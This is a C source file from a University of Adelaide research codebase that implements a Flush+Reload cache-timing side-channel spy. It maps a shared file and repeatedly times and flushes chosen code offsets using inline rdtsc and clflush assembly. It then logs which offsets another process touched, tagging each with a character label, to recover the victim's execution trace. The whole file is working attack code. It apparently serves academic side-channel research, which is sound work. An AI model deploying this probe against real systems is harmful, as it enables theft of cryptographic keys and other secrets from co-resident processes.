/*
 * Copyright 2013,2014 The University of Adelaide
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *     Unless required by applicable law or agreed to in writing, software
 *     distributed under the License is distributed on an "AS IS" BASIS,
 *     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *     See the License for the specific language governing permissions and
 *     limitations under the License.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

#include "mem.h"
#include "config.h"


#define NTIMING 100000
//#define CUTOFF 10000
#define CUTOFF 150
//#define CUTOFF 180



inline unsigned long gettime() {
  volatile unsigned long tl;
  asm __volatile__("lfence\nrdtsc" : "=a" (tl): : "%edx");
  return tl;
}

inline int probe(char *adrs) {
  volatile unsigned long time;

  asm __volatile__ (
    "  mfence             \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    "  clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  return time;
}

inline void flush(char *adrs) {
  asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (adrs) :);
}

void listen(char **ptrs, int noffsets, int *timings, int slot_size) {
    int ind;
    int i;
    int current;
    int slotstart;

    ind = 0; 

    for (i = 0; i < noffsets; i++)
        flush(ptrs[i]);

    slotstart = gettime();

    while (ind < NTIMING) {
        for (i = 0; i < noffsets; i++) {
            timings[ind * noffsets + i] = probe(ptrs[i]);
        }

        ind++;

        do {
          current = gettime();
        } while (current - slotstart < slot_size);

        slotstart += slot_size;
        while (current - slotstart > slot_size) {
            if (ind < NTIMING) {
                for (i = 0; i < noffsets; i++) {
                    timings[ind * noffsets + i] = -1;
                }
                ind++;
            }
            slotstart += slot_size;
        }
    }
}

int print_timings(int *timings, int len, int noffsets) {
    int i, j;

    for (i = 0; i < len; i++) {
        printf("%d", i);
        for (j = 0; j < noffsets; j++) {
            printf("\t%d", timings[i * noffsets + j]);
        }
        putchar('\n');
    }
}


int main(int argc, char **argv) {
    config_t conf =readConfig(argv[1]);
    if (!checkConfig(conf))
    exit(1);

    char *ip = map(conf->fileName, 0);
    int noffsets = conf->noffsets;
    char **ptrs = malloc(sizeof(char *) * noffsets);
    int i, j;
    for (i = 0; i < noffsets; i++)
    ptrs[i] = ip + ((conf->offsets[i] - conf->base) & ~0x3f);
    int *times = malloc(sizeof(long) * noffsets);
    int *touched = malloc(sizeof(int) * noffsets);
    int *timings = calloc(sizeof(int), noffsets * NTIMING);
    int back_buf_len = 1000;
    int *back_buf = calloc(sizeof(int), noffsets * back_buf_len);
    int back_buf_pos = 0;
    int used_back_buf = 0;
    long tmp;
    int n = 0;
    int ind = 0;
    int first = 10;
    int second = 10;
    unsigned int slotstart;
    unsigned int current;
    int hit;
    int listen_mode = 0;

    if (argc > 2) {
        if (strchr(argv[2], 'l')) {
            listen_mode = 1;
        }
    }

    if (listen_mode) {
        listen(ptrs, noffsets, timings, conf->slotSize);
        print_timings(timings, NTIMING, noffsets);

        return 0;
    }

    char *buffer = malloc (NTIMING);
    setvbuf(stdout, buffer, _IOLBF, NTIMING);

    for (i = 0; i < noffsets; i++)
        flush(ptrs[i]);
    slotstart = gettime();

    while (1) {
        hit = 0;
        for (i = 0; i < noffsets; i++) {
          times[i] = probe(ptrs[i]);
          touched[i] = (times[i] < CUTOFF);
          hit |= touched[i];
        }

        /*
        for (i = 0; i < noffsets; i++) {
            back_buf[back_buf_pos * noffsets + i] = times[i];
        }
        back_buf_pos++;

        if (back_buf_pos >= back_buf_len) {
            memcpy(back_buf, back_buf + back_buf_len / 2 + back_buf_len % 2, back_buf_len / 2);
            back_buf_pos = back_buf_len / 2;
        }
        */

        if (ind < NTIMING) {
            if ((ind > 0) || hit) {
                for (i = 0; i < noffsets; i++) 
                    timings[ind * noffsets + i] = times[i];
                ind++;
            }
            /*
            if (ind == 1 && !used_back_buf && !first) {
                ind = 0;

                memcpy(timings + ind*noffsets, back_buf + (back_buf_pos - back_buf_len / 2) * noffsets, (back_buf_len / 2) * noffsets);
                */
                /*
                for (i = back_buf_pos - back_buf_len / 2; i < back_buf_pos; i++) {
                    for (j = 0; j < noffsets; j++) {
                        timings[ind * noffsets + j] = back_buf[i * noffsets + j];
                    }
                    ind++;
                }
                */

            /*
                ind += back_buf_len / 2;

                used_back_buf = 1;
            } 
            */
        }

        if (hit && ind < NTIMING) {
          n = 100;
        } else if (n) {
          if (--n == 0) {
              if (ind < 500 /*(!first && (ind < 1000 + back_buf_len / 2)) || (first && ind < 1000)*/) {
                  ind = 0;
                  used_back_buf = 0;
              } else if (first) {
                  first = 0;
                  ind = 0;
              } else {
                  printf("Index");
                  for (i = 0; i < noffsets; i++)
                      printf("\t%c", conf->chars[i]);
                  putchar('\n');
                  for (j = 0; j < ind; j++) {
                      printf("%d", j);
                      for (i = 0; i < noffsets; i++) 
                          printf("\t%d", timings[j * noffsets + i]);
                      putchar('\n');
                  }
                  ind = 0;
                  return 0;

              }
          }
        }

      do {
          current = gettime();
      } while (current - slotstart < conf->slotSize);
      slotstart += conf->slotSize;
      while (current - slotstart > conf->slotSize) {
          if (ind < NTIMING && ind > 0) {
              for (i = 0; i < noffsets; i++)
                  timings[ind * noffsets + i] = -1;
              ind++;
          }
          slotstart += conf->slotSize;
      }
  }
}
